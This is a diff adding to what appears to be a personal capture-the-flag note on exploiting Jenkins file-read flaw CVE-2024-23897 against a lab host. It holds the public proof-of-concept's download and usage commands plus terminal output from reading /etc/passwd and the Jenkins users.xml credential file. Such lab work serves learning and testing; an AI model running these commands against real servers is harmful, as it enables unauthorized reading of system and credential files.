@@ -41,3 +41,73 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel**
 ![[jenkins-credentials.png]]
 
 ![[jenkins-2443-exploit-poc.png]]
+
+
+
+https://github.com/xaitax/CVE-2024-23897
+
+python CVE-2024-23897.py -t <target> -p <port> -f <file>
+
+
+Exploitation Sequence
+
+/etc/passwd
+Confirm the exploit works and find the service user home.
+
+/var/jenkins_home/users/users.xml
+
+
+----------------------------
+
+doing something wrong here
+
+revisit another day
+
+┌──(lanc3㉿kali)-[~]
+└─$ wget https://raw.githubusercontent.com/xaitax/CVE-2024-23897/refs/heads/main/CVE-2024-23897.py
+--2026-01-14 19:29:24--  https://raw.githubusercontent.com/xaitax/CVE-2024-23897/refs/heads/main/CVE-2024-23897.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7015 (6.9K) [text/plain]
+Saving to: ‘CVE-2024-23897.py’
+
+CVE-2024-23897.py                      100%[=========================================================================>]   6.85K  --.-KB/s    in 0.001s  
+
+2026-01-14 19:29:24 (11.4 MB/s) - ‘CVE-2024-23897.py’ saved [7015/7015]
+
+                                                                                                                                                         
+┌──(lanc3㉿kali)-[~]
+└─$ chmod +x CVE-2024-23897.py
+                                                                                                                                                         
+┌──(lanc3㉿kali)-[~]
+└─$ python3 CVE-2024-23897.py -t 10.10.11.10 -p 8080 -f /etc/passwd               
+
+CVE-2024-23897 | Jenkins <= 2.441 & <= LTS 2.426.2 PoC and scanner.
+Alexander Hagenah / @xaitax / ah@primepage.de"
+
+🔍 Scanning http://10.10.11.10:8080
+💣 Exploit Response from http://10.10.11.10:8080: 
+ 
+ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+java -jar jenkins-cli.jar help
+ [COMMAND]
+Lists all the available commands or a detailed description of single command.
+ COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)
+
+                                                                                                                                                         
+┌──(lanc3㉿kali)-[~]
+└─$ python3 CVE-2024-23897.py -t 10.10.11.10 -p 8080 -f /var/jenkins_home/users/users.xml
+
+CVE-2024-23897 | Jenkins <= 2.441 & <= LTS 2.426.2 PoC and scanner.
+Alexander Hagenah / @xaitax / ah@primepage.de"
+
+🔍 Scanning http://10.10.11.10:8080
+💣 Exploit Response from http://10.10.11.10:8080: 
+ 
+ERROR: Too many arguments: <hudson.model.UserIdMapper>                                                                                                   
+java -jar jenkins-cli.jar help                                                                                                                           
+ [COMMAND]                                                                                                                                               
+Lists all the available commands or a detailed description of single command.                                                                            
+ COMMAND : Name of the command (default: <?xml version='1.1' encoding='UTF-8'?>)                                                                         
+                                                                                     
